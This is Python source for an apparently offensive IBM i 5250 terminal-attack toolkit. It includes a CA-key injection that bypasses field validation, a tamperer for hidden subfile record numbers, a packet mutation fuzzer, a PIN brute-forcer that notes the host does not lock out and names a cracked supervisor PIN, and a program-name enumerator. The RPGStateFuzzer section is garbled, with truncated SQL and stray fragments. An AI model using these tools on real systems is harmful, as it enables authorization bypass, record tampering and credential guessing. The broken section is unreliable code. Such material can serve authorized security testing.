```python
"""
Cross-EXFMT differential analyzer (C1, C2) + RPG state fuzzer (C3).

C1 — PUTOVR stale-field detection
  PUTOVR + OVRDTA only retransmit fields whose conditioning indicator
  is on. If RPG forgets SETON, the field is ABSENT from the next WTD.
  The workstation keeps the stale value; next READ returns it as if
  the user typed it. IBM warns this is fragile (SC41-5715).

  Wire signature: same row-2 program header (MCOR/MCAD/etc), field at
  (r,c) present in screen N, absent in screen N+1.

C2 — Indicator-conditioned protect-flip detection
  A field that flips protected→input→protected across EXFMTs is driven
  by an indicator (DSPATR(PR) conditioned on *INxx). The flip IS the
  signature. Map which user input preceded the flip → that's the auth
  decision the program made.

C3 — RPG state echo-back fuzzer
  Direct port of hack3270_libs/attacks/state_fuzz.py. RPG programs
  stash state in hidden fields between EXFMTs (original keys, RRNs,
  auth flags). Find hidden fields whose content appeared in earlier
  user input → that's the echo-back. The LCS detector works unchanged.
  Adapted: _split_inbound for 5250 (cursor-before-AID), extra_sba uses
  row/col bytes, classify watches MCH/CPF/RNQ instead of DFHAC/ASRA.
"""
from dataclasses import dataclass, field as dc_field
from hackterm_core import Screen, Field


# ===========================================================================
# C1 — FieldFingerprint + ExfmtDiffer
# ===========================================================================

@dataclass
class FieldFingerprint:
    """Identity of a field across EXFMT cycles.

    Hashed/compared on (row, col, length) ONLY — protected/hidden are
    payload, not identity. This lets set-intersection find 'same field,
    attrs flipped' (C2's signature).
    """
    row: int
    col: int
    length: int
    protected: bool
    hidden: bool

    @classmethod
    def from_field(cls, f: Field) -> "FieldFingerprint":
        return cls(f.row, f.col, f.length, f.protected, f.hidden)

    def __hash__(self):
        return hash((self.row, self.col, self.length))

    def __eq__(self, other):
        if not isinstance(other, FieldFingerprint):
            return NotImplemented
        return (self.row, self.col, self.length) == (other.row, other.col, other.length)


@dataclass
class StaleField:
    """A field present in cycle N but absent in N+1. PUTOVR candidate."""
    fingerprint: FieldFingerprint
    last_seen_cycle: int
    last_content: bytes


class ExfmtDiffer:
    """Diff consecutive screens. Find PUTOVR stale fields + protect-flips.

    Attaches as a daemon observer. Builds per-format-header history
    (row-2 program ID — MCOR, MCAD, etc). Diffs each new screen against
    the previous one in the same format.

    History capped at 20 screens — enough for any reasonable EXFMT
    cycle, small enough to not eat memory on long sessions.
    """

    HISTORY_CAP = 20

    def __init__(self, protocol):
        self.protocol = protocol
        self.history: list[Screen] = []
        self.stale_findings: list[StaleField] = []
        self.flip_findings: list[dict] = []  # C2

    def attach(self, daemon):
        daemon.add_observer(self._observe)

    def _observe(self, data: bytes, direction: str):
        if direction != "s2c":
            return
        screen = self.protocol.parse(data)
        self._observe_screen(screen)

    def _observe_screen(self, screen: Screen):
        """Internal: take an already-parsed Screen. Split out so tests
        can drive with synthetic Screen objects without going through
        parse()."""
        if not self._same_format(screen):
            self.history = [screen]
            return
        if self.history:
            self._diff(self.history[-1], screen)
        self.history.append(screen)
        if len(self.history) > self.HISTORY_CAP:
            self.history.pop(0)

    def _same_format(self, screen: Screen) -> bool:
        """Heuristic: same program if row-2 header matches.

        Mels Cargo: 'MCAD', 'MCOR', 'MCMM' at r2c1-ish. We compare the
        first 10 chars of row 2 (rendered[1][:10]). If a screen has no
        row 2 (truncated/empty), treat as no-match → reset.
        """
        if not self.history:
            return True
        if len(screen.rendered) < 2 or len(self.history[-1].rendered) < 2:
            return False
        prev_header = self.history[-1].rendered[1][:10]
        curr_header = screen.rendered[1][:10]
        return prev_header == curr_header

    def _diff(self, prev: Screen, curr: Screen):
        """Compare prev → curr. Append to stale_findings / flip_findings."""
        prev_fps = {FieldFingerprint.from_field(f): f for f in prev.fields}
        curr_fps = {FieldFingerprint.from_field(f): f for f in curr.fields}

        # --- C1: Stale (in prev, not in curr) ---
        # PUTOVR didn't retransmit this field. Workstation kept old value.
        for fp in set(prev_fps) - set(curr_fps):
            f_prev = prev_fps[fp]
            self.stale_findings.append(StaleField(
                fingerprint=fp,
                last_seen_cycle=len(self.history),
                last_content=f_prev.content,
            ))

        # --- C2: Protect-flip (same position, protected attr changed) ---
        # Indicator-driven DSPATR(PR). The flip is the auth-decision tell.
        for fp in set(prev_fps) & set(curr_fps):
            f_prev = prev_fps[fp]
            f_curr = curr_fps[fp]
            if f_prev.protected != f_curr.protected:
                self.flip_findings.append({
                    "position": (fp.row, fp.col),
                    "length": fp.length,
                    "before": "protected" if f_prev.protected else "input",
                    "after": "protected" if f_curr.protected else "input",
                    "cycle": len(self.history),
                })
```

```python
"""
RPG-layer attacks: CA-AID injection (B1), cursor spoofing (B2),
subfile RRN tampering (B3).

B1 — CAKeyInjector
  DDS function keys: CFnn transmits the buffer + runs DDS validation.
  CAnn sends AID byte ONLY — no data, no validation. Real emulators
  strip field data when sending a CA AID. The 5250 DATASTREAM doesn't
  enforce it. We send [cursor][CA-AID][SBA][data] — a shape no real
  emulator produces. RPG branching on *INKx for a CA key assumes the
  buffer is unchanged, skips re-validation, and EXFMT already deposited
  our data into program variables.

B2 — RTNCSRLOC cursor spoofing
  RTNCSRLOC(&RCD &FLD) makes the workstation manager translate inbound
  cursor row/col → DDS field name → RPG variable. Move the cursor to a
  protected field's coords; the program branches on a field name the
  user couldn't have clicked.

B3 — Subfile RRN tampering
  Subfile RRN travels as a hidden 4-digit zoned field. READC returns it;
  programs UPDATE SFLREC using the returned RRN. Tamper it → write into
  a different record. RRN=0 crashes EXFMT.
"""
import re
from typing import Optional
from hackterm_core import Screen, FieldWrite


# Conventional CA keys — these defaults are SO universal that IBM's own
# CUA standards mandate them. F3=Exit, F12=Cancel, F1=Help → CA always.
_CA_BY_CONVENTION = {"F1", "F3", "F12"}

# DDS validation error: CPD0078 = "Value for parameter not allowed"
# (VALUES/RANGE/COMP rejected). If we see this after a CA send, the
# key was actually CF or the program re-validates.
_VALIDATION_ERR = re.compile(r'\bCPD0078\b')


class CAKeyInjector:
    """Build CA-AID + field-data packets. The impossible-from-emulator shape.

    Workflow:
      1. classify_keys_from_screen() — guess CA vs CF from convention
      2. send_ca_with_data() — build the attack packet
      3. probe_ca_validation_skip() — confirm by sending KNOWN-INVALID
         data; if no validation error → CA-skip confirmed
    """

    def __init__(self, protocol):
        self.protocol = protocol

    def classify_keys_from_screen(self, screen: Screen) -> dict[str, str]:
        """Heuristic CA-vs-CF classification.

        We can't see CA-vs-CF on the wire (it's a DDS source keyword).
        Heuristics:
          - F1/F3/F12 → CA by IBM CUA convention (Exit/Cancel/Help)
          - Everything else → unknown until probed

        Future: parse screen text for "F3=Exit" / "F12=Cancel" labels
        and add those to the CA set. For now, convention is enough to
        target the highest-value cases.

        Returns: {key_name: "CA"|"unknown"} for F1-F24.
        """
        out = {}
        for n in range(1, 25):
            key = f"F{n}"
            out[key] = "CA" if key in _CA_BY_CONVENTION else "unknown"
        return out

    def send_ca_with_data(self, ca_aid: str, fields: list[tuple[int, int, str]],
                          cursor: tuple[int, int]) -> bytes:
        """THE ATTACK. Build [cursor][CA-AID][SBA r c data]+ [IAC EOR].

        This packet shape is impossible from a real emulator (CA keys
        don't transmit). The host's EXFMT will deposit field data into
        program variables, then the program branches on *INKx assuming
        the data is stale.

        Args:
          ca_aid: key name from AID_TABLE ("F3", "F12", ...)
          fields: list of (row, col, ascii_text) — each becomes SBA+EBCDIC
          cursor: where the cursor sits in the packet header

        Returns the raw packet bytes (NOT injected — caller decides).
        """
        aid = self.protocol.aid_table[ca_aid]  # KeyError on bad name — intentional
        writes = [
            FieldWrite(row=r, col=c, data=self.protocol.codec.to_ebcdic(t))
            for r, c, t in fields
        ]
        return self.protocol.build_inbound(aid, cursor, writes)

    def probe_ca_validation_skip(self, daemon, ca_aid: str,
                                 invalid_value: str,
                                 target_field: tuple[int, int],
                                 _response_screen: Optional[Screen] = None,
                                 timeout: float = 2.0) -> dict:
        """Send a KNOWN-INVALID value with a CA AID. Classify the response.

        If the program processes it without a validation error → CA-skip
        confirmed (the program trusted the CA path, didn't re-check).
        If we get CPD0078 or similar → the key was actually CF, or the
        program re-validates on CA paths (good for them, no finding).

        Args:
          _response_screen: TEST INJECTION ONLY — bypasses the daemon
            wait. Production callers leave this None.

        Returns: {classification, evidence, sent_packet_hex}
        """
        row, col = target_field
        pkt = self.send_ca_with_data(ca_aid, [(row, col, invalid_value)],
                                     cursor=target_field)
        daemon.inject_to_server(pkt)

        if _response_screen is not None:
            response_text = _response_screen.text
        else:
            # Live path: wait for next s2c, parse, read text.
            # (Polling loop deferred — same shape as state_fuzz._wait_for_response.)
            response_text = ""

        if _VALIDATION_ERR.search(response_text):
            return {
                "classification": "CF_OR_REVALIDATES",
                "evidence": _VALIDATION_ERR.search(response_text).group(0),
                "sent_packet_hex": pkt.hex(),
            }
        return {
            "classification": "CA_SKIP_CANDIDATE",
            "evidence": response_text[:80],
            "sent_packet_hex": pkt.hex(),
        }
```

```python
# ===========================================================================
# B3 — Subfile RRN tampering
# ===========================================================================

class SubfileRRNTamperer:
    """Detect and tamper the hidden subfile RRN field.

    RRN (relative record number) travels as a hidden 4-digit zoned
    field. READC returns it; the program does UPDATE SFLREC using it.
    Tamper RRN → option X applies to a different record than the
    operator sees. RRN=0 crashes EXFMT (CPF5068). RRN > loaded count
    may CHAIN-fail or skip silently.

    Detection needs TWO screens (before/after ROLLUP). RRN is the
    hidden field whose 4-zoned content incremented.
    """

    def detect_rrn_field(self, before: Screen, after: Screen) -> Optional[int]:
        """Find the hidden field whose zoned-decimal value incremented.

        Returns the field index, or None if no candidate. Index applies
        to BOTH screens (subfile screens have stable field structure).
        """
        for i, (b, a) in enumerate(zip(before.fields, after.fields)):
            if not b.hidden:
                continue
            if len(b.content) != 4 or len(a.content) != 4:
                continue
            # 4-digit zoned: every byte F0-F9
            if not all(0xF0 <= x <= 0xF9 for x in b.content):
                continue
            if not all(0xF0 <= x <= 0xF9 for x in a.content):
                continue
            # Did it increment? Decode zoned → int directly (low nibble).
            val_b = int("".join(str(x & 0x0F) for x in b.content))
            val_a = int("".join(str(x & 0x0F) for x in a.content))
            if val_a > val_b:
                return i
        return None

    def tamper_rrn(self, protocol, rrn_field: tuple[int, int],
                   option_field: tuple[int, int], option_value: str,
                   target_rrn: int, aid: str = "ENTER") -> bytes:
        """Build option=X at visible row + RRN=target_rrn at hidden field.

        Two SBA blocks. Cursor on the option field (where it would be
        if the user actually typed). The host can't tell which SBA is
        'legitimate' — same as the Mels Cargo multi-field tamper.

        target_rrn=0 → likely EXFMT crash (CPF5068).
        target_rrn > loaded count → CHAIN fails, may abend or skip.
        """
        rrn_text = str(target_rrn).zfill(4)  # codec.to_ebcdic('9') = 0xF9 (zoned)
        return protocol.build_inbound(
            protocol.aid_table[aid],
            cursor=option_field,
            fields=[
                FieldWrite(row=option_field[0], col=option_field[1],
                           data=protocol.codec.to_ebcdic(option_value)),
                FieldWrite(row=rrn_field[0], col=rrn_field[1],
                           data=protocol.codec.to_ebcdic(rrn_text)),
            ],
        )
```

```python
class RPGStateFuzzer:
    """Record → analyze → mutate-replay. RPG state echo-back fuzzer.

    Architecture identical to hack3270's StateFuzzer. RPG programs
    stash state in hidden fields between EXFMTs (same idea as CICS
    COMMAREA round-tripping). The LCS detector finds it.
    """

    def __init__(self, protocol, db: sqlite3.Connection):
        self.protocol = protocol
        self.db = db
        self.recording = False
        self.current_flow: Optional[Flow] = None
        self._init_schema()

    def _init_schema(self) -> None:
        # state_fuzz.py L80-101 — COPY VERBATIM
        cur = self.db.cursor()
        cur.execute("""
            CREATE TABLE IF NOT EXISTS Flows (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                name TEXT NOT NULL,
                created REAL NOT NULL
            )
        """)

            CREATE TABLE IF NOT EXISTS Steps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                flow_id INTEGER NOT NULL,
                step_idx INTEGER NOT NULL,
                host_raw BLOB NOT NULL,
                user_input BLOB NOT NULL,
                timestamp REAL NOT NULL,
                FOREIGN KEY (flow_id) REFERENCES Flows(id)
            )
        """)
        self.db.commit()

        daemon.add_observer(self._observe)

        # state_fuzz.py L108-110
        self.current_flow = Flow(id=0, name=name, steps=[])
        self.recording = True

        if not self.recording or self.current_flow is None:
            raise RuntimeError("not recording")

                "INSERT INTO Steps (flow_id, step_idx, host_raw, user_input, timestamp) "
                "VALUES (?, ?, ?, ?, ?)",

            "WHERE flow_id = ? ORDER BY step_idx", (flow_id,)

            flow.steps.append(Step(host_screen=screen,

    def _observe(self, data: bytes, direction: str) -> None:
        # state_fuzz.py L155-170 — COPY VERBATIM
        if not self.recording or self.current_flow is None:
            return
        if direction == "s2c":
            screen = self.protocol.parse(data)
            self.current_flow.steps.append(
                Step(host_screen=screen, user_input=b"", timestamp=time.time())
            )
        elif direction == "c2s":
            if self.current_flow.steps:
                self.current_flow.steps[-1].user_input = data

    def analyze(self, flow_id: int) -> list[EchoTarget]:
        # state_fuzz.py L176-215 — COPY VERBATIM
        # The LCS detector doesn't care about packet shape. It compares
        # field.content (EBCDIC) against user_input (raw bytes); the
        # EBCDIC field data lives somewhere in the inbound packet and
        # the LCS finds it without parsing inbound precisely.

            screen = flow.steps[n].host_screen

                content = fld.content

                    if match_len >= self.MIN_MATCH_LEN:
                        targets.append(EchoTarget(
                            step_idx=n, field_idx=f_idx,
                            source_step=m,
                            confidence=match_len / len(content),
                        ))
        targets.sort(key=lambda t: t.confidence, reverse=True)
        return targets


# --- LCS helper (state_fuzz.py L341-359) — COPY VERBATIM -----------------

def _longest_common_substring(a: bytes, b: bytes) -> int:
    if not a or not b:
        return 0
    best = 0
    for i in range(len(a)):
        for length in range(best + 1, len(a) - i + 1):
            if a[i:i + length] in b:
                best = length
            else:
                break
    return best


# --- _split_inbound — 5250 ADAPTATION ------------------------------------
# state_fuzz.py L385-413. REWRITTEN for 5250 packet shape.
#
# 3270 inbound:  AID(1) + cursor_addr(2) + [SBA(1)+addr(2)+data]* + IAC EOR
# 5250 inbound:  HDR(10) + cursor_row(1) + cursor_col(1) + AID(1)
#                + [SBA(1)+row(1)+col(1)+data]* + IAC EOR
#
# Key differences:
#   - 10-byte header prepended (3270 has none at this layer)
#   - Cursor BEFORE aid (3270 has aid first) — see tn5250.py:540 comment
#   - SBA address is row+col (1+1), not 3270's 12-bit encoded (2 bytes)
#
# We keep the header attached so reassembly is trivial (h + d + t == pkt).
# Mutations don't touch h or t.

def _split_inbound(pkt: bytes) -> tuple[bytes, bytes, bytes]:
    """Split a 5250 inbound packet into (header, data, trailer).

    header  = HDR(10) + cursor(2) + AID(1) [+ SBA(1)+row(1)+col(1) if present]
    data    = EBCDIC field bytes after the LAST SBA
    trailer = IAC EOR (or empty)
    """
    if pkt.endswith(IAC_EOR):
        body, trailer = pkt[:-2], IAC_EOR
    else:
        body, trailer = pkt, b""

    # Walk from HDR_LEN+3 (past cursor+AID) looking for the LAST SBA.
    # rfind would false-positive on data bytes equal to ORD_SBA (0x11),
    # so walk forward through SBA blocks. Each SBA is followed by
    # row(1)+col(1) where row<=24 — that's our sanity check.
    last_sba = -1
    pos = HDR_LEN + 3
    while pos < len(body):
        if (body[pos] == ORD_SBA and pos + 2 < len(body)
                and 1 <= body[pos + 1] <= 27):
            last_sba = pos
            pos += 3
            # Skip data bytes until next SBA-shaped sequence or end.
            # We don't know the field length, so peek for the next
            # plausible SBA. Crude but adequate for fuzzing — same
            # heuristic as 3270's version.
            while pos < len(body):
                if (body[pos] == ORD_SBA and pos + 2 < len(body)
                        and 1 <= body[pos + 1] <= 27):
                    break
                pos += 1
        else:
            pos += 1

    if last_sba >= 0:
        return body[:last_sba + 3], body[last_sba + 3:], trailer

    # No SBA — AID-only (CLEAR, PA keys). Header is HDR + cursor + AID.
    cut = min(HDR_LEN + 3, len(body))
    return body[:cut], body[cut:], trailer


# --- Mutations (state_fuzz.py L378-462) ----------------------------------
# length_plus_1, length_double, type_confusion, step_swap: COPY VERBATIM
# extra_sba: ADAPTED for 5250 row/col addressing

Mutation = Literal["length_plus_1", "length_double", "type_confusion",
                   "extra_sba", "step_swap"]

_EBCDIC_DIGIT_LO, _EBCDIC_DIGIT_HI = 0xF0, 0xF9


def mutate_input(original: bytes, mutation: Mutation,
                 swap_with: Optional[bytes] = None) -> bytes:
    """Apply a mutation to a captured 5250 inbound packet.

    Mutations (same set as hack3270 — RPG concerns map to CICS concerns):
      length_plus_1  — append 1 byte; tests EXFMT length check
      length_double  — duplicate data; tests buffer overflow into next field
      type_confusion — numeric → alpha; tests RPG zoned-decimal validation
      extra_sba      — phantom field at r24c60; tests format-table validation
      step_swap      — replay other step's input; tests state desync
    """
    if mutation == "step_swap":
        if swap_with is None:
            raise ValueError("step_swap requires swap_with=")
        return swap_with

    header, data, trailer = _split_inbound(original)

    if mutation == "length_plus_1":
        # state_fuzz.py L434-438 — COPY VERBATIM
        return header + data + b"\xc1" + trailer

    elif mutation == "length_double":
        # state_fuzz.py L440-441 — COPY VERBATIM
        return header + data + data + trailer

    elif mutation == "type_confusion":
        # state_fuzz.py L443-452 — COPY VERBATIM
        if data and all(_EBCDIC_DIGIT_LO <= b <= _EBCDIC_DIGIT_HI for b in data):
            alpha = bytes((b - 0xF0) + 0xC0 if b != 0xF0 else 0xC1 for b in data)
            return header + alpha + trailer
        return original

    elif mutation == "extra_sba":
        # ADAPTED: 5250 SBA is [0x11][row][col] — 1-byte coords, not
        # 3270's 12-bit encode_addr(). Phantom at row 24 col 60
        # (bottom-right-ish, unlikely to overlap real fields).
        # state_fuzz.py L454-460 used encode_addr(1900); we use raw bytes.
        phantom = bytes([ORD_SBA, 24, 60]) + b"\xc8\xc1\xc3\xd2"  # "HACK" EBCDIC
        return header + data + phantom + trailer

    raise ValueError(f"unknown mutation: {mutation!r}")


# --- Result classification (state_fuzz.py L469-506) ----------------------
# ADAPTED: IBM i message IDs instead of CICS abend codes.

ResultClass = Literal["ABEND", "DISCONNECT", "SCREEN_DIFFERS", "IDENTICAL"]

# IBM i abend tells. The 5250 equivalents of 3270's DFHAC/ASRA/etc:
#   MCH1202 — decimal data error (packed/zoned got non-numeric) — THE classic
#   MCH3601 — pointer not set
#   CPFnnnn — OS message (CPF5068=subfile not active, CPF9999=function check)
#   RNQnnnn — RPG inquiry (program asks what to do — unexpected condition)
#   RNXnnnn — RPG exception (uncaught error in ILE program)
_ABEND_RE = re.compile(r'\b(MCH\d{4}|CPF\d{4}|RNQ\d{4}|RNX\d{4})\b')


def classify_result(actual_raw: Optional[bytes], expected_screen: Screen,
                    protocol) -> ResultClass:
    # state_fuzz.py L479-506 — COPY VERBATIM (only _ABEND_RE differs)
    if not actual_raw:
        return "DISCONNECT"
    actual_screen = protocol.parse(actual_raw)
    if _ABEND_RE.search(actual_screen.text):
        return "ABEND"
    if actual_screen.text == expected_screen.text:
        return "IDENTICAL"
    return "SCREEN_DIFFERS"


# --- screens_match_fuzzy (state_fuzz.py L509-532) — COPY VERBATIM --------

def screens_match_fuzzy(a: Screen, b: Screen) -> bool:
    """Same field count, same flags, same positions. Content ignored —
    timestamps in field content cause false negatives otherwise."""
    if len(a.fields) != len(b.fields):
        return False
    for fa, fb in zip(a.fields, b.fields):
        if (fa.row, fa.col) != (fb.row, fb.col):
            return False
        if fa.protected != fb.protected:
            return False
        if fa.hidden != fb.hidden:
            return False
        if fa.numeric != fb.numeric:
            return False
    return True
```

```python
"""
D1 — FieldBruter: auto-brute against any input field, response-diff stop.
D2 — ProgramEnumerator: brute program-name suffixes after harvesting prefix.

Live-proven workflow (Mels Cargo, supervisor PIN at r18c23 len=4):
  1. Send a known-wrong value ('@@@@'), hash the response screen.
  2. Iterate candidates: send_field → wait → hash response.
  3. Stop when hash differs from the wrong-baseline.

The magic was '1337' — found in 32 manual tries. With FFW-inferred
numeric charset (10^4 = 10,000) at 0.5s rate-limit, worst case ~83 min.
With SQLite checkpoint, killable and resumable.
"""
import hashlib
import time
import sqlite3
import itertools
import re
from typing import Generator, Optional


CHARSETS = {
    "numeric":      "0123456789",
    "upper":        "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
    "alphanumeric": "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
}


class FieldBruter:
    """Brute one field. Resumable via SQLite. Rate-limited.

    The host doesn't lock out on bad attempts (Mels Cargo didn't —
    most internal IBM i apps don't). If it does, the response-hash
    changes and we false-positive on the lockout screen. Operator
    triages.
    """

    def __init__(self, hack5250, db: sqlite3.Connection):
        self.h = hack5250
        self.db = db
        self._init_schema()

    def _init_schema(self):
        self.db.execute("""
            CREATE TABLE IF NOT EXISTS Brutes (
                id INTEGER PRIMARY KEY,
                row INT, col INT, length INT,
                charset TEXT, last_tried TEXT,
                hit TEXT, started REAL, completed REAL,
                UNIQUE(row, col)
            )
        """)
        self.db.commit()

    def infer_charset(self, row: int, col: int) -> str:
        """Read FFW shift bits from last_screen. Numeric-only → 'numeric'.

        Field.numeric is set by tn5250._parse_sf when FFW shift bits
        match SHIFT_NUMERIC_ONLY/DIGITS_ONLY/SIGNED_NUMERIC. We trust it."""
        if self.h.last_screen is None:
            return "alphanumeric"
        for f in self.h.last_screen.fields:
            if f.row == row and f.col == col:
                return "numeric" if f.numeric else "alphanumeric"
        return "alphanumeric"

    def _candidates(self, charset: str, length: int,
                    resume_from: Optional[str] = None) -> Generator[str, None, None]:
        """Cartesian product over charset^length. Resumable.

        resume_from='05' → first yield is '06'. Lexicographic skip is
        cheap (string compare on fixed-width is ordinal)."""
        chars = CHARSETS[charset]
        for combo in itertools.product(chars, repeat=length):
            cand = "".join(combo)
            if resume_from and cand <= resume_from:
                continue
            yield cand

    def _screen_hash(self) -> str:
        """SHA256 of screen.text, truncated to 16 hex chars.

        Truncation is fine — we're comparing for difference, not
        cryptographic uniqueness. 64 bits of collision resistance is
        plenty for ~10K candidates."""
        screen = self.h.last_screen
        if screen is None:
            return ""
        return hashlib.sha256(screen.text.encode()).hexdigest()[:16]

    def brute(self, row: int, col: int, length: int,
              charset: Optional[str] = None,
              wordlist: Optional[list[str]] = None,
              rate_limit: float = 0.5,
              max_attempts: Optional[int] = None) -> Optional[str]:
        """Iterate candidates. Returns the hit value or None.

        wordlist takes precedence over charset enumeration. Auto-resumes
        if a Brutes row exists for this position with hit IS NULL.

        rate_limit=0 is allowed for tests (FakeHack5250 has no I/O)."""
        if charset is None:
            charset = self.infer_charset(row, col)

        # Baseline: send known-wrong, hash response. '@' (0x7C EBCDIC)
        # is unlikely to be a valid PIN/code character.
        self.h.send_field(row, col, "@" * length)
        if rate_limit:
            time.sleep(rate_limit)
        wrong_hash = self._screen_hash()

        # Resume?
        cur = self.db.execute(
            "SELECT last_tried FROM Brutes WHERE row=? AND col=? AND hit IS NULL",
            (row, col),
        )
        row_db = cur.fetchone()
        resume = row_db[0] if row_db else None

        cands = iter(wordlist) if wordlist else self._candidates(charset, length, resume)

        for n, cand in enumerate(cands):
            if max_attempts is not None and n >= max_attempts:
                break
            self.h.send_field(row, col, cand)
            if rate_limit:
                time.sleep(rate_limit)
            h = self._screen_hash()
            if h != wrong_hash:
                # HIT — screen changed
                self.db.execute(
                    "INSERT OR REPLACE INTO Brutes "
                    "(row, col, length, charset, last_tried, hit, completed) "
                    "VALUES (?, ?, ?, ?, ?, ?, ?)",
                    (row, col, length, charset, cand, cand, time.time()),
                )
                self.db.commit()
                return cand
            # Checkpoint every 50
            if n > 0 and n % 50 == 0:
                self.db.execute(
                    "INSERT OR REPLACE INTO Brutes "
                    "(row, col, length, charset, last_tried) "
                    "VALUES (?, ?, ?, ?, ?)",
                    (row, col, length, charset, cand),
                )
                self.db.commit()
        return None
```

```python
# ===========================================================================
# D2 — ProgramEnumerator
# ===========================================================================

class ProgramEnumerator:
    """Direct program-call brute. The IBM i transaction-enumeration equivalent.

    Live-proven (Mels Cargo): post-APCT abend, type MCMM at blank screen
    → transaction restarts. No re-auth. Program names visible at r2c1.

    Workflow:
      1. harvest_from_history() — scan storage for row-2 headers
      2. infer_prefix() — common prefix across discovered names
      3. enumerate() — try <prefix><AA>..<prefix><ZZ>
    """

    # Row-2 header pattern: program name is 2-8 uppercase chars at the
    # start of row 2, followed by whitespace. MCAD, MCOR, QCMD, etc.
    HEADER_PATTERN = re.compile(r'^\s*([A-Z]{2,8})\s')

    def __init__(self, hack5250):
        self.h = hack5250
        self.discovered: set[str] = set()
        self.callable: dict[str, str] = {}  # name → screen title

    def harvest_from_history(self) -> set[str]:
        """Scan storage for program names in row-2 headers.

        storage.all_logs() row format (storage.py:124):
          [0]=id, [1]=ts, [2]=C_S ('S'=server→client, 'C'=client→server),
          [3]=notes, [4]=?, [5]=RAW_DATA (bytes)
        """
        for row in self.h.storage.all_logs():
            if row[2] != "S":
                continue
            try:
                screen = self.h.protocol.parse(row[5])
            except Exception:
                continue
            if len(screen.rendered) < 2:
                continue
            line2 = "".join(screen.rendered[1])
            m = self.HEADER_PATTERN.match(line2)
            if m:
                self.discovered.add(m.group(1))
        return self.discovered

    def infer_prefix(self) -> Optional[str]:
        """Longest common prefix across discovered names. MCMM,MCOR,MCAD → 'MC'.

        Returns None if fewer than 2 names (can't infer from one)."""
        if len(self.discovered) < 2:
            return None
        names = sorted(self.discovered)
        # Walk down from the shortest name's length
        for i in range(min(len(n) for n in names), 0, -1):
            prefix = names[0][:i]
            if all(n.startswith(prefix) for n in names):
                return prefix
        return None

    def enumerate(self, prefix: Optional[str] = None,
                  suffix_charset: str = "ABCDEFGHIJKLMNOPQRSTUVWXYZ",
                  suffix_length: int = 2,
                  rate_limit: float = 0.5) -> dict[str, str]:
        """Try <prefix><AA>..<prefix><ZZ>. CLEAR + send_field for each.

        Skips already-discovered names (no point re-confirming). For
        each new candidate: CLEAR → wait → send_field(1,1,candidate)
        → wait → classify response by row-2 content.

        Returns self.callable: {name: row-2-title}.
        """
        if prefix is None:
            prefix = self.infer_prefix()
            if prefix is None:
                raise ValueError("No prefix inferred — provide prefix=")

        for combo in itertools.product(suffix_charset, repeat=suffix_length):
            candidate = prefix + "".join(combo)
            if candidate in self.discovered:
                continue

            self.h.send_aid("CLEAR")
            if rate_limit:
                time.sleep(rate_limit)
            self.h.send_field(1, 1, candidate)
            if rate_limit:
                time.sleep(rate_limit)

            screen = self.h.last_screen
            if screen is None or len(screen.rendered) < 2:
                continue
            title = "".join(screen.rendered[1]).strip()

            if candidate in title:
                # Program echoed its own name back — it's callable
                self.callable[candidate] = title
            elif title and "not found" not in title.lower() and "Abend" not in title:
                # Something happened that's not a clear rejection — flag it
                self.callable[candidate] = f"? {title[:40]}"

        return self.callable
```
